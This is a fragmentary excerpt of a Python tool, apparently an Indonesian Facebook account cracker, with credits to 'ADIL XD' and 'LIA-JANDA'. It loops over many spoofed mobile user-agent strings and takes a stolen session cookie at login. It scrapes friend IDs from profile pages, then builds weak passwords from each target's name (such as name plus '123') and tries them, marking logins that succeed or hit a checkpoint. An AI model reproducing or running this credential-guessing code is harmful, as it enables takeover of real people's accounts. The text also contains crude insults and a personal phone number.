...
for z in range(200):
	...
	ua_s = f"Mozilla/5.0 (Linux; Android 4.4.1; zh-CN; PRO 5 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/48.0.2564.116 Mobile Safari/537.36 T7/9.1 baidubrowser/7.18.11.0]"
	ua_i = f"Mozilla/5.0 (Linux; Android 9; ALP-AL00 Build/HUAWEIALP-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/72.0.3626.121 Mobile Safari/537.36 baidubrowser/7.19.13.0 (Baidu; P1 9)]"
	ua_o = f"Mozilla/5.0 (Linux; Android 7.0; HUAWEI NXT-AL10 Build/HUAWEINXT-AL10; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/48.0.2564.116 Mobile Safari/537.36 baidubrowser/7.9.12.0 (Baidu; P1 7.0)]"
	ua_s = f"Mozilla/5.0 (Linux; Android 5.1.1; OPPO R7sm Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/48.0.2564.116 Mobile Safari/537.36 baidubrowser/7.8.4.224 (Baidu; P1 5.1.1)]"
	ua_n = f"Mozilla/5.0 (Linux; Android 4.4.1; vivo X6D Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 Mobile Safari/537.36 baidubrowser/4.0.18.6 (Baidu; P1]"
	ua_n = f"Mozilla/5.0 (Linux; Android 7.1.2; sm6500 Build/N2G48H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/68.0.3440.70 Mobile Safari/537.36 bdbrowser/6.4.0.4]"
	ua_s = f"Mozilla/5.0 (Linux; Android 4.4.3; OPPO A57 Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/35.0.1916.138 Mobile Safari/537.36 baidubrowser/7.18.21.0 (Baidu; P1]"
	ua_s = f"Mozilla/5.0 (Linux; Android 8.0; BLA-AL00 Build/HUAWEIBLA-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/48.0.2564.116 Mobile Safari/537.36 T7/9.1 baidubrowser/7.18.11.0 (Baidu; P1 8.0.0)]"
	ua_s = f"Mozilla/5.0 (Linux; Android 5.1; MI 6 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/48.0.2564.116 Mobile Safari/537.36 T7/9.3 baidubrowser/7.18.23.0]"
	ua_i = f"Mozilla/5.0 (Linux; Android 8.1.0; PBDM00 Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/62.0.3202.84 Mobile Safari/537.36 baidubrowser/7.19.11.0 (Baidu; P1 8.1.0)]"
	ua_s = f"Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI CRR-CL00 Build/HUAWEICRR-CL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/62.0.3202.84 Mobile Safari/537.36 T7/9.1 baidubrowser/7.17.12.0]"
	ua_s = f"Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4X Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/35.0.1916.138 Mobile Safari/537.36 baidubrowser/7.14.14.0 (Baidu; P1]"
	ua_i = f"Mozilla/5.0 (Linux; Android 4.4.3; SM-N9500 Build/R16NW; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/35.0.1916.138 Mobile Safari/537.36 baidubrowser/4.0.18.6 (Baidu; P1]"
	ua_s = f"Mozilla/5.0 (Linux; Android 5.1; MI 6 Build/OPR1.170623.027) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/49.0.2623.105 Mobile Safari/537.36 baidubrowser/4.0.18.6 (Baidu; P1]"
	ua_s = f"Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4X Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/48.0.2564.116 Mobile Safari/537.36 T7/9.1 baidubrowser/7.18.11.0 (Baidu; P1 7.0)]"
	ua_i = f"Mozilla/5.0 (Linux; U; Android 8.0.0; zh-cn; STF-AL10 Build/HUAWEISTF-AL10) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 Mobile Safari/537.36 T7/9.3 baidubrowser/7.18.23.0 (Baidu; P1 8.0)]"
	ua_s = f"Mozilla/5.0 (Linux; Android 7.1.1; SM-N935F Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/35.0.1916.138 Mobile Safari/537.36 T7/9.1 baidubrowser/7.18.20.0]"
	ua_s = f"Mozilla/5.0 (Linux; Android 9; SM-M305F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 bdbrowser/1.12.23]"
	ua_r = f"Mozilla/5.0 (Linux; Android 9; Redmi Note 5 Build/PKQ1.180904.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 bdbrowser/6.4.0.4]"
	ua_r = f"Mozilla/5.0 (Linux; Android 8.1.0; Redmi Note 5 Build/OPM1.171019.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/62.0.3202.84 Mobile Safari/537.36 baidubrowser/7.18.11.0 (Baidu; P1 8.1.0)]"
	ua_i = f"Mozilla/5.0 (iPhone; CPU iPhone OS 12_5_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16H81 [FBAN/FBIOS;FBDV/iPhone6,1;FBMD/iPhone;FBSN/iOS;FBSV/12.5.7;FBSS/2;FBID/phone;FBLC/es_LA;FBOP/5]"
	ua_s = f"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36]"
	ua_v = f"Mozilla/5.0 (Linux; Android 9; AURA X Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/{str(rr(1,30))}.0 Chrome/{str(rr(10,190))}.0.{str(rr(1000,6000))}.{str(rr(10,290))} Mobile Safari/537.36]"
	ua_s = f"Mozilla/5.0 (Linux; Android 7.0; GRANT Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/{str(rr(1,30))}.0 Chrome/{str(rr(10,190))}.0.{str(rr(1000,6000))}.{str(rr(10,290))} Mobile Safari/537.36]"
	ua_o = f"Mozilla/5.0 (Linux; Android 4.2.2; Zync Z7i 3G Build/JDQ39) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/{str(rr(1,30))}.0 Chrome/{str(rr(10,190))}.0.{str(rr(1000,6000))}.{str(rr(10,290))} Mobile Safari/537.36]"
	ua_s = f"Mozilla/5.0 (Linux; Android 4.4.2; Q2624 Build/LRX22C) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/{str(rr(1,30))} SamsungBrowser/{str(rr(1,30))}.0 Chrome/{str(rr(10,190))}.0.{str(rr(1000,6000))}.{str(rr(10,290))} Mobile Safari/537.36]"
	ua_o = f"Mozilla/5.0 (Linux; Android 10; LIV 1S Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/{str(rr(1,30))}.0 Chrome/{str(rr(10,190))}.0.{str(rr(1000,6000))}.{str(rr(10,290))} Mobile Safari/537.36]"
	ua_s = f"Mozilla/5.0 (Linux; Android 5.0; C15100m) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/{str(rr(94,119))}.0.0.0 Mobile Safari/537.36]"
	ua_o = f"Mozilla/5.0 (Linux; Android 9; Nexo-TAB-7) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/{str(rr(10,190))}.0.{str(rr(1000,6000))}.{str(rr(10,290))} Mobile Safari/537.36]"
	ua_s = f"Mozilla/5.0 (Linux; Android 6.0; NASCO TANGO 7) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/{str(rr(1,30))}.0 Chrome/{str(rr(10,190))}.0.{str(rr(1000,6000))}.{str(rr(10,290))} Mobile Safari/537.36]"
	ua_o = f"Mozilla/5.0 (Linux; Android 10; ASPERA_R9 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/{str(rr(1,30))}.0 Chrome/{str(rr(10,190))}.0.{str(rr(1000,6000))}.{str(rr(10,290))} Mobile Safari/537.36]"
	ua_o = f"Mozilla/5.0 (Linux; Android 6.0; Caryota 9) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/{str(rr(1,30))}.0 Chrome/{str(rr(10,190))}.0.{str(rr(1000,6000))}.{str(rr(10,290))} Mobile Safari/537.36]"
	ua_s = f"Mozilla/5.0 (Linux; Android 5.1; MITO_T89) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/{str(rr(1,30))}.0 Chrome/{str(rr(10,190))}.0.{str(rr(1000,6000))}.{str(rr(10,290))} Mobile Safari/537.36]"
	ua_o = f"Mozilla/5.0 (Linux; Android 13; V2239 Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, seperti Gecko) VenusBrowser/3.2.42 Chrome/104.0.5112.97 Mobile Safari/537.36]"
	ua_s = f"Mozilla/5.0 (Linux; Android 11; TECNO BD4 Build/RP1A.201005.001) AppleWebKit/537.36 (KHTML, seperti Gecko) VenusBrowser/3.5 Chrome/113.0.5672.162 Mobile Safari/537.36]"
	ua_o = f"Mozilla/5.0 (Linux; U; Android 6.0; zh-cn; M1 E Build/MRA58K) AppleWebKit/537.36 (KHTML, seperti Gecko)Version/4.0 Chrome/37.0.0.0 MQQBrowser/{str(rr(1,30))}.0 Chrome/{str(rr(10,190))}.0.{str(rr(1000,6000))}.{str(rr(10,290))} Mobile Safari/537.36]"
	ua_o = f"Mozilla/5.0 (Linux; Android 13; XQ-DQ72 Build/67.0.A.4.51; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/{str(rr(1,30))}.0 Chrome/{str(rr(10,190))}.0.{str(rr(1000,6000))}.{str(rr(10,290))} Mobile Safari/537.36]"
	ua_s = f"Mozilla/5.0 (Linux; Android 4.4.2; MITO T10 Build/KOT49H) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/{str(rr(1,30))}.0 Chrome/{str(rr(10,190))}.0.{str(rr(1000,6000))}.{str(rr(10,290))} Mobile Safari/537.36]"
	ua_o = f"Mozilla/5.0 (Linux; Android 10; Redmi 8 Build/QKQ1.191014.001) AppleWebKit/537.36 (KHTML, seperti Gecko) VenusBrowser/{str(rr(1,30))}.0 Chrome/{str(rr(10,190))}.0.{str(rr(1000,6000))}.{str(rr(10,290))} Mobile Safari/537.36]"
	ua_s = f"Mozilla/5.0 (Linux; Android 9; BRAVIA 4K GB ATV3 Build/PTT1.190515.001.S43) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/{str(rr(1,30))}.0 Chrome/{str(rr(10,190))}.0.{str(rr(1000,6000))}.{str(rr(10,290))} Mobile Safari/537.36]"
	ua_o = f"Mozilla/5.0 (Linux; Android 4.4.2; Primo F5 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(1,30))}.0 Chrome/{str(rr(10,190))}.0.{str(rr(1000,6000))}.{str(rr(10,290))} Mobile Safari/537.36]"
	ua_s = f"Mozilla/5.0 (Linux; U; Android 5.0.1; en-US; Primo GM mini Build/KOT49H) AppleWebKit/534.30 (KHTML, seperti Gecko) Versi/4.0 UCBrowser/{str(rr(1,30))}.0 Chrome/{str(rr(10,190))}.0.{str(rr(1000,6000))}.{str(rr(10,290))} Mobile Safari/534.30]"
	ua_o = f"Mozilla/5.0 (Linux; Android 5.1; Primo RX4 Build/LMY47I) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/{str(rr(1,30))}.0 Chrome/{str(rr(10,190))}.0.{str(rr(1000,6000))}.{str(rr(10,290))} Mobile Safari/537.36]"
	ua_s = f"Mozilla/5.0 (Linux; Android 7.0; Primo GH7 Build/NRD90M) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/{str(rr(1,30))}.0 Chrome/{str(rr(10,190))}.0.{str(rr(1000,6000))}.{str(rr(10,290))} Mobile Safari/537.36]"
	ua_o = f"Mozilla/5.0 (Linux; Android 7.0; Primo H6 Plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(1,30))}.0 Chrome/{str(rr(10,190))}.0.{str(rr(1000,6000))}.{str(rr(10,290))} Mobile Safari/537.36]"
	ua_s = f"Mozilla/5.0 (Linux; Android 11; ZTE Blade A51 Lite RU) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(1,30))}.0 Chrome/{str(rr(10,190))}.0.{str(rr(1000,6000))}.{str(rr(10,290))} Mobile Safari/537.36]"
	ua_o = f"Mozilla/5.0 (Linux; Android 6.0; Primo EF4+ Build/Primo_EF4+_S008_05092016; en-us) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/{str(rr(1,30))}.0 Chrome/{str(rr(10,190))}.0.{str(rr(1000,6000))}.{str(rr(10,290))} Mobile Safari/537.36]"
	ua = str(rc([ua_d,ua_s]))
...
for xcTeam in range(1000):
	...
	ngentot4 = f"Dalvik/2.1.0 (Android 13; SM-S918BBuild/TP1A.220624.014.186049.001)[FBAN/MessengerLite;FBAV/138.0.0.2.132;FBPN/com.facebook.mlite;FBLC/en_US;FBBV/241285382;FBCR/Airtel;FBMF/Facebook;Facebook/lge;FBDV/SM-S918B;FBSV/13;FBCA"
	if ngentot4 in ngentott:pass
	else:ngentott.append(ngentot4)
	ngentot5 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; Infinix X5514D Build/{g2}.{str(rr(111111,210000))}.0{g1}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
...
{B2}╭──────────────────────╮{B2}╭───────────────╮{B2}╭────────────────────────────╮
{B2}│ {P2}Author : ADIL XD{B2}│{B2}│ {P2}Version : 2.1 {B2}│{B2}│ {P2}Recode By : LIA-JANDA{B2}       │
...
class Login:
	...
	def menu_login(self):
		...
		if login in["1","01"]:
			...
			cookie = console.input(f" {H2}• {P2}Pajak cookie : ")
...
class Menu:
	...
	def cek_login(self,cookie):
		try:
			...
			prints(Panel(f"""{M2} Jaringan Lu""",width=87,style=f"{color_panel}"))
			exit()
	...
	def menu(self):
		...
		yonkou.append(Panel(f" {K2}Nama Akun       {P2}: {H2}{nama}\n {K2}Status Pengguna {P2}: {H2}PRIBADI\n {K2}Ip Address      {P2}: {H2}{self.ip}\n {K2}Tanggal         {P2}: {H2}{tgl}",width=43,padding=(0,2),title=f"{M2}• {H2}• {K2}• {K2}Lia Janda {M2}• {H2}• {K2}•",style=f"{color_panel}"))
		yonkou.append(Panel(f" {K2}Recode By {P2}: {H2}AdilXd\n {K2}Github  {P2} : {H2}github.com\n{K2} Facebook {P2}: {H2}hội chợ\n{K2} Whatsapp {P2}: {H2}+6282246820989",width=43,padding=(0,2),title=f"{M2}• {H2}• {K2}• {K2}Lia Janda {M2}• {H2}• {K2}•",style=f"{color_panel}"))
		self.jol.print(Columns(yonkou))
		cetak(Panel(f"{H2}LIA JANDA ID, ADILXD ID, Adil",width=87,title=f"{H2}Thanks To",style=f"{color_panel}"))
		...
		try:
			...
			for z in url.find_all("a",href=True):
				if "fref" in z.get("href"):
					...
					console.print(f" {H2}• {P2} Sabar Anjing  {len(tampung)} id Facebook....", end="\r")
...
class Crack:
	...
	def atursandi(self):
		prints(Panel(f"""{P2}    Sabar  {len(tampung)} Anjing""",width=87,padding=(0,21),style=f"{color_panel}"))
					...
					try:
						...
						if len(nama)<=5:
							...
							if len(belakang)<3:
								...
								pwx.append(depan+belakang+"123")
								pwx.append(depan+belakang+"321")
								pwx.append(depan+belakang+"1324")
								pwx.append(depan+belakang+"54321")
							else:
								pwx.append(depan+belakang)
			...
			for pw in pwx:
				...
				if "session_key" in post.text and "EAA" in post.text:
					...
					if user in self.ok or user in self.cp:
						...
						tree.add(Panel(f"{K2}   Checkpoint{P2}",width=30,padding=(0,2),style=f"{color_cp}"))
